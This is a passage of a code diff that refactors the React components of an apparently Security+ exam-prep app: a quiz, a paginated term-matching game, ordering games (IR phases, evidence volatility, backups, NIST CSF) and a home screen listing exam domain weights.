+                <span style={{fontSize:12,fontWeight:700,color:dp>=70?"#22c55e":dp>=50?"#f9c74f":"#ef4444"}}>{dp}% ({da.length}q)</span>
               </div>
-            );
+              <div style={{height:4,background:"#1e293b",borderRadius:2}}><div style={{height:"100%",width:`${dp}%`,background:d.color,borderRadius:2,transition:"width .5s"}}/></div>
+            </div>);
           })}
         </div>
-        <button onClick={reset} style={primaryBtn}>Try Again</button>
+        <button onClick={reset} style={C.primary}>Try Again</button>
       </div>
     );
   }
-
-  return (
-    <div style={{ padding: "16px 16px 100px" }}>
-      <h2 style={{ fontFamily: "Syne, sans-serif", fontSize: 22, marginBottom: 16, color: "#f1f5f9" }}>🎯 Practice Quiz</h2>
-      <div className="scroll-x" style={{ marginBottom: 16 }}>
-        {[{ id: 0, name: "All", color: "#00d4ff" }, ...DOMAINS.map(d => ({ ...d, name: `D${d.id}` }))].map(d => (
-          <button key={d.id} onClick={() => { setDFilter(d.id); reset(); }} style={chipStyle(dFilter === d.id, d.color)}>{d.name}</button>
+  return(
+    <div style={{padding:"16px 16px 100px"}}>
+      <h2 style={{fontFamily:"Syne,sans-serif",fontSize:22,marginBottom:16,color:"#f1f5f9"}}>🎯 Practice Quiz <span style={{fontSize:13,color:"#475569",fontFamily:"inherit",fontWeight:400}}>({QUIZ.length} questions)</span></h2>
+      <div className="sx" style={{marginBottom:16}}>
+        {[{id:0,name:"All",color:"#00d4ff"},...DOMAINS.map(d=>({...d,name:`D${d.id}`}))].map(d=>(
+          <button key={d.id} onClick={()=>{setDf(d.id);reset();}} style={chip(df===d.id,d.color)}>{d.name}</button>
         ))}
       </div>
-      <div style={{ display: "flex", justifyContent: "space-between", marginBottom: 8, fontSize: 12, color: "#475569" }}>
-        <span>Q {cur + 1} / {questions.length}</span>
-        <span style={{ color: "#22c55e" }}>{score} correct</span>
+      <div style={{display:"flex",justifyContent:"space-between",marginBottom:8,fontSize:12,color:"#475569"}}>
+        <span>Q {cur+1}/{qs.length}</span><span style={{color:"#22c55e"}}>{score} correct</span>
       </div>
-      <div style={{ height: 4, background: "#1e293b", borderRadius: 2, marginBottom: 16 }}>
-        <div style={{ height: "100%", width: `${(cur / questions.length) * 100}%`, background: "#00d4ff", borderRadius: 2, transition: "width 0.3s" }} />
+      <div style={{height:4,background:"#1e293b",borderRadius:2,marginBottom:16}}><div style={{height:"100%",width:`${(cur/qs.length)*100}%`,background:"#00d4ff",borderRadius:2,transition:"width .3s"}}/></div>
+      <div style={{...C.card,marginBottom:14}}>
+        <div style={{fontSize:11,color:DOMAINS.find(d=>d.id===q.d)?.color||"#00d4ff",letterSpacing:1,textTransform:"uppercase",marginBottom:10}}>Domain {q.d}</div>
+        <div style={{fontSize:15,fontWeight:600,color:"#f1f5f9",lineHeight:1.65,fontFamily:"Syne,sans-serif"}}>{q.q}</div>
       </div>
-      <div style={{ ...card, marginBottom: 14 }}>
-        <div style={{ fontSize: 11, color: DOMAINS.find(d => d.id === q.d)?.color || "#00d4ff", letterSpacing: 1, textTransform: "uppercase", marginBottom: 10 }}>Domain {q.d}</div>
-        <div style={{ fontSize: 15, fontWeight: 600, color: "#f1f5f9", lineHeight: 1.65, fontFamily: "Syne, sans-serif" }}>{q.q}</div>
-      </div>
-      <div style={{ display: "flex", flexDirection: "column", gap: 10, marginBottom: 14 }}>
-        {q.opts.map((opt, i) => {
-          let bg = "#080f1a", bdr = "#1e293b", clr = "#94a3b8";
-          if (sel !== null) {
-            if (i === q.a) { bg = "#052e16"; bdr = "#22c55e"; clr = "#86efac"; }
-            else if (i === sel) { bg = "#2d0a0a"; bdr = "#ef4444"; clr = "#fca5a5"; }
-          }
-          return (
-            <button key={i} onClick={() => pick(i)} style={{ background: bg, border: `1px solid ${bdr}`, borderRadius: 12, padding: "14px 16px", textAlign: "left", cursor: sel !== null ? "default" : "pointer", color: clr, fontSize: 14, fontFamily: "inherit", display: "flex", alignItems: "center", gap: 12, minHeight: 52, transition: "all 0.2s" }}>
-              <span style={{ width: 26, height: 26, borderRadius: 6, background: bdr + "33", display: "flex", alignItems: "center", justifyContent: "center", fontSize: 12, fontWeight: 700, color: bdr, flexShrink: 0 }}>{["A","B","C","D"][i]}</span>
-              <span style={{ lineHeight: 1.4 }}>{opt}</span>
-              {sel !== null && i === q.a && <span style={{ marginLeft: "auto" }}>✓</span>}
-              {sel !== null && i === sel && i !== q.a && <span style={{ marginLeft: "auto" }}>✗</span>}
-            </button>
-          );
+      <div style={{display:"flex",flexDirection:"column",gap:10,marginBottom:14}}>
+        {q.opts.map((opt,i)=>{
+          let bg="#080f1a",bd="#1e293b",cl="#94a3b8";
+          if(sel!==null){if(i===q.a){bg="#052e16";bd="#22c55e";cl="#86efac";}else if(i===sel){bg="#2d0a0a";bd="#ef4444";cl="#fca5a5";}}
+          return(<button key={i} onClick={()=>pick(i)} style={{background:bg,border:`1px solid ${bd}`,borderRadius:12,padding:"14px 16px",textAlign:"left",cursor:sel!==null?"default":"pointer",color:cl,fontSize:14,fontFamily:"inherit",display:"flex",alignItems:"center",gap:12,minHeight:52,transition:"all .2s"}}>
+            <span style={{width:26,height:26,borderRadius:6,background:bd+"33",display:"flex",alignItems:"center",justifyContent:"center",fontSize:12,fontWeight:700,color:bd,flexShrink:0}}>{["A","B","C","D"][i]}</span>
+            <span style={{lineHeight:1.4}}>{opt}</span>
+            {sel!==null&&i===q.a&&<span style={{marginLeft:"auto"}}>✓</span>}
+            {sel!==null&&i===sel&&i!==q.a&&<span style={{marginLeft:"auto"}}>✗</span>}
+          </button>);
         })}
       </div>
-      {sel !== null && (
-        <div style={{ ...card, borderLeft: "3px solid #22c55e", background: "#060f0a", marginBottom: 14 }}>
-          <div style={{ fontSize: 11, color: "#22c55e", letterSpacing: 1, textTransform: "uppercase", marginBottom: 6 }}>Explanation</div>
-          <div style={{ fontSize: 13, color: "#94a3b8", lineHeight: 1.7, marginBottom: 14 }}>{q.exp}</div>
-          <button onClick={next} style={primaryBtn}>{cur + 1 < questions.length ? "Next →" : "See Results"}</button>
+      {sel!==null&&(
+        <div style={{...C.card,borderLeft:"3px solid #22c55e",background:"#060f0a",marginBottom:14}}>
+          <div style={{fontSize:11,color:"#22c55e",letterSpacing:1,textTransform:"uppercase",marginBottom:6}}>Explanation</div>
+          <div style={{fontSize:13,color:"#94a3b8",lineHeight:1.7,marginBottom:14}}>{q.exp}</div>
+          <button onClick={next} style={C.primary}>{cur+1<qs.length?"Next →":"See Results"}</button>
         </div>
       )}
     </div>
   );
 }
 
-// ─── MATCH ────────────────────────────────────────────────────────────────────
+// ── MATCH ─────────────────────────────────────────────────────────────────────
+function Match(){
+  const PAGE=12;
+  const [page,setPage]=useState(0);
+  const [selT,setSelT]=useState(null);
+  const [selM,setSelM]=useState(null);
+  const [matched,setMatched]=useState([]);
+  const [wrong,setWrong]=useState(false);
+  const [done,setDone]=useState(false);
+  const [moves,setMoves]=useState(0);
+  const pagePairs=MATCH_PAIRS.slice(page*PAGE,(page+1)*PAGE);
+  const [shuffled,setShuffled]=useState(()=>([...pagePairs.map(p=>p.match)].sort(()=>Math.random()-.5)));
 
-function Match() {
-  const [selTerm, setSelTerm] = useState(null);
-  const [selMatch, setSelMatch] = useState(null);
-  const [matched, setMatched] = useState([]);
-  const [wrong, setWrong] = useState(false);
-  const [done, setDone] = useState(false);
-  const [moves, setMoves] = useState(0);
-  const [shuffled] = useState(() => [...MATCH_PAIRS.map(p => p.match)].sort(() => Math.random() - 0.5));
+  const resetPage=(p)=>{
+    const pp=MATCH_PAIRS.slice(p*PAGE,(p+1)*PAGE);
+    setShuffled([...pp.map(x=>x.match)].sort(()=>Math.random()-.5));
+    setSelT(null);setSelM(null);setMatched([]);setWrong(false);setDone(false);setMoves(0);
+  };
 
-  useEffect(() => {
-    if (selTerm && selMatch) {
-      setMoves(m => m + 1);
-      const pair = MATCH_PAIRS.find(p => p.term === selTerm && p.match === selMatch);
-      if (pair) {
-        const next = [...matched, selTerm];
+  useEffect(()=>{
+    if(selT&&selM){
+      setMoves(m=>m+1);
+      const pair=pagePairs.find(p=>p.term===selT&&p.match===selM);
+      if(pair){
+        const next=[...matched,selT];
         setMatched(next);
-        if (next.length === MATCH_PAIRS.length) setDone(true);
-        setSelTerm(null); setSelMatch(null);
-      } else {
+        if(next.length===pagePairs.length)setDone(true);
+        setSelT(null);setSelM(null);
+      }else{
         setWrong(true);
-        setTimeout(() => { setSelTerm(null); setSelMatch(null); setWrong(false); }, 700);
+        setTimeout(()=>{setSelT(null);setSelM(null);setWrong(false);},700);
       }
     }
-  }, [selTerm, selMatch]);
+  },[selT,selM]);
 
-  const reset = () => { setSelTerm(null); setSelMatch(null); setMatched([]); setWrong(false); setDone(false); setMoves(0); };
-  const isTermMatched = t => matched.includes(t);
-  const isMatchMatched = m => matched.some(t => MATCH_PAIRS.find(p => p.term === t)?.match === m);
+  const isT=t=>matched.includes(t);
+  const isM=m=>matched.some(t=>pagePairs.find(p=>p.term===t)?.match===m);
+  const totalPages=Math.ceil(MATCH_PAIRS.length/PAGE);
 
-  return (
-    <div style={{ padding: "16px 16px 100px" }}>
-      <div style={{ display: "flex", justifyContent: "space-between", alignItems: "center", marginBottom: 6 }}>
-        <h2 style={{ fontFamily: "Syne, sans-serif", fontSize: 22, color: "#f1f5f9" }}>🧩 Match Game</h2>
-        <div style={{ fontSize: 12, color: "#475569" }}>{matched.length}/{MATCH_PAIRS.length} · {moves} moves</div>
+  return(
+    <div style={{padding:"16px 16px 100px"}}>
+      <div style={{display:"flex",justifyContent:"space-between",alignItems:"center",marginBottom:6}}>
+        <h2 style={{fontFamily:"Syne,sans-serif",fontSize:22,color:"#f1f5f9"}}>🧩 Match Game</h2>
+        <div style={{fontSize:12,color:"#475569"}}>{matched.length}/{pagePairs.length}·{moves}mv</div>
       </div>
-      {done ? (
-        <div style={{ ...card, textAlign: "center", padding: 40 }}>
-          <div style={{ fontSize: 48, marginBottom: 12 }}>🎉</div>
-          <div style={{ fontFamily: "Syne, sans-serif", fontSize: 22, color: "#f1f5f9", marginBottom: 8 }}>All Matched!</div>
-          <div style={{ fontSize: 14, color: "#64748b", marginBottom: 24 }}>Completed in {moves} moves</div>
-          <button onClick={reset} style={primaryBtn}>Play Again</button>
+      <div className="sx" style={{marginBottom:14}}>
+        {Array.from({length:totalPages},(_,i)=>(
+          <button key={i} onClick={()=>{setPage(i);resetPage(i);}} style={chip(page===i,"#f9c74f")}>Set {i+1}</button>
+        ))}
+      </div>
+      {done?(
+        <div style={{...C.card,textAlign:"center",padding:40}}>
+          <div style={{fontSize:48,marginBottom:12}}>🎉</div>
+          <div style={{fontFamily:"Syne,sans-serif",fontSize:22,color:"#f1f5f9",marginBottom:8}}>Set {page+1} Complete!</div>
+          <div style={{fontSize:14,color:"#64748b",marginBottom:24}}>Done in {moves} moves</div>
+          <div style={{display:"flex",gap:10}}>
+            <button onClick={()=>resetPage(page)} style={{...C.primary,flex:1}}>Play Again</button>
+            {page+1<totalPages&&<button onClick={()=>{setPage(p=>p+1);resetPage(page+1);}} style={{...C.primary,flex:1,background:"#a855f7"}}>Next Set →</button>}
+          </div>
         </div>
-      ) : (
+      ):(
         <>
-          <p style={{ fontSize: 12, color: "#475569", marginBottom: 14 }}>Tap a term, then tap its matching definition</p>
-          <div style={{ display: "grid", gridTemplateColumns: "1fr 1fr", gap: 8 }}>
-            <div style={{ display: "flex", flexDirection: "column", gap: 6 }}>
-              <div style={{ fontSize: 10, color: "#475569", letterSpacing: 1, textTransform: "uppercase", marginBottom: 2 }}>Terms</div>
-              {MATCH_PAIRS.map(({ term: t }) => {
-                const isSel = selTerm === t, isM = isTermMatched(t), isW = wrong && isSel;
-                return (
-                  <button key={t} onClick={() => !isM && setSelTerm(t)} style={{ background: isM ? "#052e16" : isSel ? "#0d2d40" : isW ? "#2d0a0a" : "#0a1525", border: `1px solid ${isM ? "#22c55e" : isSel ? "#00d4ff" : isW ? "#ef4444" : "#1e293b"}`, borderRadius: 10, padding: "10px", textAlign: "left", cursor: isM ? "default" : "pointer", color: isM ? "#86efac" : isSel ? "#00d4ff" : "#94a3b8", fontSize: 12, fontFamily: "inherit", fontWeight: 600, minHeight: 44, lineHeight: 1.3, transition: "all 0.15s" }}>
-                    {isM ? "✓ " : ""}{t}
-                  </button>
-                );
+          <p style={{fontSize:12,color:"#475569",marginBottom:14}}>Tap a term then tap its matching definition</p>
+          <div style={{display:"grid",gridTemplateColumns:"1fr 1fr",gap:8}}>
+            <div style={{display:"flex",flexDirection:"column",gap:6}}>
+              <div style={{fontSize:10,color:"#475569",letterSpacing:1,textTransform:"uppercase",marginBottom:2}}>Terms</div>
+              {pagePairs.map(({term:t})=>{
+                const isSel=selT===t,isMatch=isT(t),isW=wrong&&isSel;
+                return(<button key={t} onClick={()=>!isMatch&&setSelT(t)} style={{background:isMatch?"#052e16":isSel?"#0d2d40":isW?"#2d0a0a":"#0a1525",border:`1px solid ${isMatch?"#22c55e":isSel?"#00d4ff":isW?"#ef4444":"#1e293b"}`,borderRadius:10,padding:"10px",textAlign:"left",cursor:isMatch?"default":"pointer",color:isMatch?"#86efac":isSel?"#00d4ff":"#94a3b8",fontSize:12,fontFamily:"inherit",fontWeight:600,minHeight:44,lineHeight:1.3,transition:"all .15s"}}>{isMatch?"✓ ":""}{t}</button>);
               })}
             </div>
-            <div style={{ display: "flex", flexDirection: "column", gap: 6 }}>
-              <div style={{ fontSize: 10, color: "#475569", letterSpacing: 1, textTransform: "uppercase", marginBottom: 2 }}>Definitions</div>
-              {shuffled.map(m => {
-                const isSel = selMatch === m, isM = isMatchMatched(m), isW = wrong && isSel;
-                return (
-                  <button key={m} onClick={() => !isM && setSelMatch(m)} style={{ background: isM ? "#052e16" : isSel ? "#0d2d40" : isW ? "#2d0a0a" : "#0a1525", border: `1px solid ${isM ? "#22c55e" : isSel ? "#00d4ff" : isW ? "#ef4444" : "#1e293b"}`, borderRadius: 10, padding: "10px", textAlign: "left", cursor: isM ? "default" : "pointer", color: isM ? "#86efac" : isSel ? "#00d4ff" : "#94a3b8", fontSize: 11, fontFamily: "inherit", minHeight: 44, lineHeight: 1.4, transition: "all 0.15s" }}>
-                    {isM ? "✓ " : ""}{m}
-                  </button>
-                );
+            <div style={{display:"flex",flexDirection:"column",gap:6}}>
+              <div style={{fontSize:10,color:"#475569",letterSpacing:1,textTransform:"uppercase",marginBottom:2}}>Definitions</div>
+              {shuffled.map(m=>{
+                const isSel=selM===m,isMatch=isM(m),isW=wrong&&isSel;
+                return(<button key={m} onClick={()=>!isMatch&&setSelM(m)} style={{background:isMatch?"#052e16":isSel?"#0d2d40":isW?"#2d0a0a":"#0a1525",border:`1px solid ${isMatch?"#22c55e":isSel?"#00d4ff":isW?"#ef4444":"#1e293b"}`,borderRadius:10,padding:"10px",textAlign:"left",cursor:isMatch?"default":"pointer",color:isMatch?"#86efac":isSel?"#00d4ff":"#94a3b8",fontSize:11,fontFamily:"inherit",minHeight:44,lineHeight:1.4,transition:"all .15s"}}>{isMatch?"✓ ":""}{m}</button>);
               })}
             </div>
           </div>
@@ -440,130 +644,114 @@ function Match() {
   );
 }
 
-// ─── ORDER GAME ───────────────────────────────────────────────────────────────
-
-function OrderGame({ title, items, description, color }) {
-  const [order, setOrder] = useState(() => [...items].sort(() => Math.random() - 0.5));
-  const [checked, setChecked] = useState(false);
-  const [correct, setCorrect] = useState(false);
-
-  const moveUp = i => { if (i === 0) return; const n = [...order]; [n[i-1], n[i]] = [n[i], n[i-1]]; setOrder(n); };
-  const moveDown = i => { if (i === order.length-1) return; const n = [...order]; [n[i], n[i+1]] = [n[i+1], n[i]]; setOrder(n); };
-  const check = () => { setChecked(true); setCorrect(order.every((p, i) => p === items[i])); };
-  const reset = () => { setOrder([...items].sort(() => Math.random() - 0.5)); setChecked(false); setCorrect(false); };
-
-  return (
+// ── ORDER GAMES ───────────────────────────────────────────────────────────────
+function OrderGame({items,desc,color}){
+  const [order,setOrder]=useState(()=>[...items].sort(()=>Math.random()-.5));
+  const [checked,setChecked]=useState(false);
+  const [correct,setCorrect]=useState(false);
+  const up=i=>{if(i===0)return;const n=[...order];[n[i-1],n[i]]=[n[i],n[i-1]];setOrder(n);};
+  const dn=i=>{if(i===order.length-1)return;const n=[...order];[n[i],n[i+1]]=[n[i+1],n[i]];setOrder(n);};
+  const check=()=>{setChecked(true);setCorrect(order.every((p,i)=>p===items[i]));};
+  const reset=()=>{setOrder([...items].sort(()=>Math.random()-.5));setChecked(false);setCorrect(false);};
+  return(
     <div>
-      <p style={{ fontSize: 13, color: "#64748b", marginBottom: 16 }}>{description}</p>
-      <div style={{ display: "flex", flexDirection: "column", gap: 8, marginBottom: 20 }}>
-        {order.map((item, i) => {
-          let bdr = "#1e293b", bg = "#0a1525", tc = "#94a3b8";
-          if (checked) { if (item === items[i]) { bdr = "#22c55e"; bg = "#052e16"; tc = "#86efac"; } else { bdr = "#ef4444"; bg = "#2d0a0a"; tc = "#fca5a5"; } }
-          return (
-            <div key={item} style={{ background: bg, border: `1px solid ${bdr}`, borderRadius: 12, padding: "12px 14px", display: "flex", alignItems: "center", gap: 10 }}>
-              <span style={{ width: 28, height: 28, borderRadius: 8, background: (checked ? bdr : color) + "22", display: "flex", alignItems: "center", justifyContent: "center", fontSize: 12, fontWeight: 800, color: checked ? bdr : color, flexShrink: 0 }}>{i+1}</span>
-              <span style={{ fontSize: 13, color: tc, fontWeight: 500, flex: 1, lineHeight: 1.4 }}>{item}</span>
-              {checked && <span style={{ fontSize: 16 }}>{item === items[i] ? "✓" : "✗"}</span>}
-              {!checked && (
-                <div style={{ display: "flex", flexDirection: "column", gap: 2 }}>
-                  <button onClick={() => moveUp(i)} disabled={i === 0} style={{ background: "transparent", border: "none", color: i === 0 ? "#1e293b" : "#475569", cursor: i === 0 ? "default" : "pointer", fontSize: 16, padding: "2px 8px" }}>▲</button>
-                  <button onClick={() => moveDown(i)} disabled={i === order.length-1} style={{ background: "transparent", border: "none", color: i === order.length-1 ? "#1e293b" : "#475569", cursor: i === order.length-1 ? "default" : "pointer", fontSize: 16, padding: "2px 8px" }}>▼</button>
-                </div>
-              )}
-            </div>
-          );
+      <p style={{fontSize:13,color:"#64748b",marginBottom:16}}>{desc}</p>
+      <div style={{display:"flex",flexDirection:"column",gap:8,marginBottom:20}}>
+        {order.map((item,i)=>{
+          let bd="#1e293b",bg="#0a1525",tc="#94a3b8";
+          if(checked){if(item===items[i]){bd="#22c55e";bg="#052e16";tc="#86efac";}else{bd="#ef4444";bg="#2d0a0a";tc="#fca5a5";}}
+          return(<div key={item} style={{background:bg,border:`1px solid ${bd}`,borderRadius:12,padding:"12px 14px",display:"flex",alignItems:"center",gap:10}}>
+            <span style={{width:28,height:28,borderRadius:8,background:(checked?bd:color)+"22",display:"flex",alignItems:"center",justifyContent:"center",fontSize:12,fontWeight:800,color:checked?bd:color,flexShrink:0}}>{i+1}</span>
+            <span style={{fontSize:13,color:tc,fontWeight:500,flex:1,lineHeight:1.4}}>{item}</span>
+            {checked&&<span style={{fontSize:16}}>{item===items[i]?"✓":"✗"}</span>}
+            {!checked&&<div style={{display:"flex",flexDirection:"column",gap:2}}>
+              <button onClick={()=>up(i)} disabled={i===0} style={{background:"transparent",border:"none",color:i===0?"#1e293b":"#475569",cursor:i===0?"default":"pointer",fontSize:16,padding:"2px 8px"}}>▲</button>
+              <button onClick={()=>dn(i)} disabled={i===order.length-1} style={{background:"transparent",border:"none",color:i===order.length-1?"#1e293b":"#475569",cursor:i===order.length-1?"default":"pointer",fontSize:16,padding:"2px 8px"}}>▼</button>
+            </div>}
+          </div>);
         })}
       </div>
-      {!checked ? <button onClick={check} style={primaryBtn}>Check Order</button> : (
-        <div style={{ textAlign: "center" }}>
-          <div style={{ fontSize: 36, marginBottom: 8 }}>{correct ? "🏆" : "📚"}</div>
-          <div style={{ fontSize: 16, fontWeight: 700, color: correct ? "#22c55e" : "#ef4444", marginBottom: 16, fontFamily: "Syne, sans-serif" }}>{correct ? "Perfect!" : "Not quite — check the numbers above"}</div>
-          {!correct && <div style={{ ...card, textAlign: "left", marginBottom: 16 }}>
-            <div style={{ fontSize: 11, color, letterSpacing: 1, textTransform: "uppercase", marginBottom: 10 }}>Correct Order</div>
-            {items.map((p, i) => <div key={p} style={{ fontSize: 13, color: "#94a3b8", marginBottom: 6 }}>{i+1}. {p}</div>)}
-          </div>}
-          <button onClick={reset} style={primaryBtn}>Try Again</button>
+      {!checked?<button onClick={check} style={C.primary}>Check Order</button>:(
+        <div style={{textAlign:"center"}}>
+          <div style={{fontSize:36,marginBottom:8}}>{correct?"🏆":"📚"}</div>
+          <div style={{fontSize:16,fontWeight:700,color:correct?"#22c55e":"#ef4444",marginBottom:16,fontFamily:"Syne,sans-serif"}}>{correct?"Perfect!":"Review the correct order"}</div>
+          {!correct&&<div style={{...C.card,textAlign:"left",marginBottom:16}}><div style={{fontSize:11,color,letterSpacing:1,textTransform:"uppercase",marginBottom:10}}>Correct Order</div>{items.map((p,i)=><div key={p} style={{fontSize:13,color:"#94a3b8",marginBottom:6}}>{i+1}. {p}</div>)}</div>}
+          <button onClick={reset} style={C.primary}>Try Again</button>
         </div>
       )}
     </div>
   );
 }
 
-function Games() {
-  const [game, setGame] = useState(null);
-  const IR = ["Preparation", "Detection & Analysis", "Containment", "Eradication", "Recovery", "Lessons Learned"];
-  const VOL = ["CPU Cache & Registers", "RAM / Running Processes", "Swap Files / Temp Files", "Hard Drive Image", "Archived Logs / Backups"];
-  const BACKUP = ["Full Backup — slowest to create, fastest restore", "Differential — changes since last full backup", "Incremental — fastest to create, slowest restore"];
-  const gameList = [
-    { id: "ir", emoji: "🔁", label: "IR Phase Order", desc: "Sequence the 6 incident response phases", color: "#a855f7" },
-    { id: "vol", emoji: "⚡", label: "Volatility Order", desc: "Most volatile → least volatile evidence", color: "#f9c74f" },
-    { id: "backup", emoji: "💾", label: "Backup Speed", desc: "Order backup types by creation speed", color: "#06d6a0" },
+function Games(){
+  const [g,setG]=useState(null);
+  const IR=["Preparation","Detection & Analysis","Containment","Eradication","Recovery","Lessons Learned"];
+  const VOL=["CPU Cache & Registers","RAM / Running Processes","Swap Files / Temp Files","Hard Drive Image","Archived Logs / Backups"];
+  const BAK=["Full Backup — slowest to create, fastest restore","Differential — changes since last full backup","Incremental — fastest to create, slowest restore"];
+  const NIST=["Identify","Protect","Detect","Respond","Recover"];
+  const GList=[
+    {id:"ir",emoji:"🔁",label:"IR Phase Order",desc:"Sequence the 6 incident response phases",color:"#a855f7"},
+    {id:"vol",emoji:"⚡",label:"Volatility Order",desc:"Most volatile → least volatile evidence",color:"#f9c74f"},
+    {id:"bak",emoji:"💾",label:"Backup Speed",desc:"Order backup types by creation speed",color:"#06d6a0"},
+    {id:"nist",emoji:"🛡️",label:"NIST CSF Order",desc:"Sequence the 5 NIST CSF functions",color:"#00d4ff"},
   ];
-  return (
-    <div style={{ padding: "16px 16px 100px" }}>
-      <h2 style={{ fontFamily: "Syne, sans-serif", fontSize: 22, marginBottom: 16, color: "#f1f5f9" }}>🕹️ Games</h2>
-      {!game ? gameList.map(g => (
-        <button key={g.id} onClick={() => setGame(g.id)} style={{ ...card, width: "100%", textAlign: "left", cursor: "pointer", display: "flex", alignItems: "center", gap: 16, minHeight: 72, marginBottom: 12, fontFamily: "inherit" }}>
-          <div style={{ fontSize: 32 }}>{g.emoji}</div>
-          <div>
-            <div style={{ fontFamily: "Syne, sans-serif", fontSize: 16, fontWeight: 700, color: g.color, marginBottom: 4 }}>{g.label}</div>
-            <div style={{ fontSize: 12, color: "#475569" }}>{g.desc}</div>
-          </div>
+  return(
+    <div style={{padding:"16px 16px 100px"}}>
+      <h2 style={{fontFamily:"Syne,sans-serif",fontSize:22,marginBottom:16,color:"#f1f5f9"}}>🕹️ Games</h2>
+      {!g?GList.map(x=>(
+        <button key={x.id} onClick={()=>setG(x.id)} style={{...C.card,width:"100%",textAlign:"left",cursor:"pointer",display:"flex",alignItems:"center",gap:16,minHeight:72,marginBottom:12,fontFamily:"inherit"}}>
+          <div style={{fontSize:32}}>{x.emoji}</div>
+          <div><div style={{fontFamily:"Syne,sans-serif",fontSize:16,fontWeight:700,color:x.color,marginBottom:4}}>{x.label}</div><div style={{fontSize:12,color:"#475569"}}>{x.desc}</div></div>
         </button>
-      )) : (
+      )):(
         <>
-          <button onClick={() => setGame(null)} style={backBtn}>← Back</button>
-          {game === "ir" && <OrderGame items={IR} description="Use ▲▼ to put the 6 Incident Response phases in correct order" color="#a855f7" />}
-          {game === "vol" && <OrderGame items={VOL} description="Order from MOST volatile (collect first) to LEAST volatile" color="#f9c74f" />}
-          {game === "backup" && <OrderGame items={BACKUP} description="Order backup types from fastest to create (top) to slowest (bottom)" color="#06d6a0" />}
+          <button onClick={()=>setG(null)} style={C.back}>← Back</button>
+          {g==="ir"&&<OrderGame items={IR} desc="Use ▲▼ to arrange the 6 IR phases in correct order" color="#a855f7"/>}
+          {g==="vol"&&<OrderGame items={VOL} desc="Order from MOST volatile (collect first) to LEAST volatile" color="#f9c74f"/>}
+          {g==="bak"&&<OrderGame items={BAK} desc="Order backup types from fastest to create (top) to slowest (bottom)" color="#06d6a0"/>}
+          {g==="nist"&&<OrderGame items={NIST} desc="Arrange the 5 NIST Cybersecurity Framework functions in correct order" color="#00d4ff"/>}
         </>
       )}
     </div>
   );
 }
 
-// ─── HOME ─────────────────────────────────────────────────────────────────────
-
-function Home() {
-  return (
-    <div style={{ padding: "16px 16px 100px" }}>
-      <div style={{ marginBottom: 24 }}>
-        <div style={{ fontSize: 11, color: "#00d4ff", letterSpacing: 2, textTransform: "uppercase", marginBottom: 8 }}>CompTIA Security+</div>
-        <h1 style={{ fontFamily: "Syne, sans-serif", fontSize: 30, fontWeight: 800, color: "#f1f5f9", lineHeight: 1.2, marginBottom: 6 }}>Study Hub</h1>
-        <div style={{ fontSize: 13, color: "#475569" }}>SY0-701 · Interactive Exam Prep · Kulan Institute</div>
+// ── HOME ─────────────────────────────────────────────────────────────────────
+function Home(){
+  return(
+    <div style={{padding:"16px 16px 100px"}}>
+      <div style={{marginBottom:24}}>
+        <div style={{fontSize:11,color:"#00d4ff",letterSpacing:2,textTransform:"uppercase",marginBottom:8}}>CompTIA Security+</div>
+        <h1 style={{fontFamily:"Syne,sans-serif",fontSize:30,fontWeight:800,color:"#f1f5f9",lineHeight:1.2,marginBottom:6}}>Study Hub</h1>
+        <div style={{fontSize:13,color:"#475569"}}>SY0-701 · Interactive Exam Prep · Kulan Institute</div>
       </div>
-
-      <div style={{ ...card, marginBottom: 16 }}>
-        <div style={{ fontSize: 11, color: "#475569", letterSpacing: 1, textTransform: "uppercase", marginBottom: 14 }}>Exam Domain Weights</div>
-        {DOMAINS.map(d => (
-          <div key={d.id} style={{ marginBottom: 12 }}>
-            <div style={{ display: "flex", justifyContent: "space-between", marginBottom: 4 }}>
-              <span style={{ fontSize: 12, color: "#94a3b8" }}>D{d.id}: {d.name}</span>
-              <span style={{ fontSize: 12, fontWeight: 700, color: d.color }}>{d.weight}%</span>
+      <div style={{...C.card,marginBottom:16}}>
+        <div style={{fontSize:11,color:"#475569",letterSpacing:1,textTransform:"uppercase",marginBottom:14}}>Exam Domain Weights</div>
+        {DOMAINS.map(d=>(
+          <div key={d.id} style={{marginBottom:12}}>
+            <div style={{display:"flex",justifyContent:"space-between",marginBottom:4}}>
+              <span style={{fontSize:12,color:"#94a3b8"}}>D{d.id}: {d.name}</span>
+              <span style={{fontSize:12,fontWeight:700,color:d.color}}>{d.weight}%</span>
             </div>
-            <div style={{ height: 5, background: "#1e293b", borderRadius: 3 }}>
-              <div style={{ height: "100%", width: `${d.weight * 3}%`, background: d.color, borderRadius: 3, opacity: 0.6 }} />
-            </div>
+            <div style={{height:5,background:"#1e293b",borderRadius:3}}><div style={{height:"100%",width:`${d.weight*3}%`,background:d.color,borderRadius:3,opacity:.6}}/></div>
           </div>
         ))}
       </div>
-
-      <div style={{ ...card, marginBottom: 16 }}>
-        <div style={{ fontSize: 11, color: "#475569", letterSpacing: 1, textTransform: "uppercase", marginBottom: 12 }}>Content Available</div>
-        {[["Flashcards", `${FLASHCARDS.length} terms across all 5 domains`], ["Quiz Questions", `${QUIZ.length} scenario-based questions`], ["Match Pairs", `${MATCH_PAIRS.length} term-definition pairs`], ["Order Games", "IR phases, volatility, backup types"]].map(([k, v]) => (
-          <div key={k} style={{ display: "flex", justifyContent: "space-between", paddingBottom: 8, marginBottom: 8, borderBottom: "1px solid #0f1929" }}>
-            <span style={{ fontSize: 13, color: "#475569" }}>{k}</span>
-            <span style={{ fontSize: 13, color: "#94a3b8", fontWeight: 600 }}>{v}</span>
+      <div style={{...C.card,marginBottom:16}}>
+        <div style={{fontSize:11,color:"#475569",letterSpacing:1,textTransform:"uppercase",marginBottom:12}}>Study Content</div>
+        {[["🃏 Flashcards",`${FLASHCARDS.length} terms across all 5 domains`],["🎯 Quiz Questions",`${QUIZ.length} scenario-based exam questions`],["🧩 Match Pairs",`${MATCH_PAIRS.length} term-definition pairs (3 sets)`],["🕹️ Order Games","IR phases, volatility, backups, NIST CSF"]].map(([k,v])=>(
+          <div key={k} style={{display:"flex",justifyContent:"space-between",paddingBottom:8,marginBottom:8,borderBottom:"1px solid #0f1929"}}>
+            <span style={{fontSize:13,color:"#475569"}}>{k}</span>
+            <span style={{fontSize:13,color:"#94a3b8",fontWeight:600}}>{v}</span>
           </div>
         ))}
       </div>
-
-      <div style={{ ...card, background: "#0a0d1a", borderColor: "#1a1e2e" }}>
-        <div style={{ fontSize: 11, color: "#475569", letterSpacing: 1, textTransform: "uppercase", marginBottom: 12 }}>Exam Info</div>
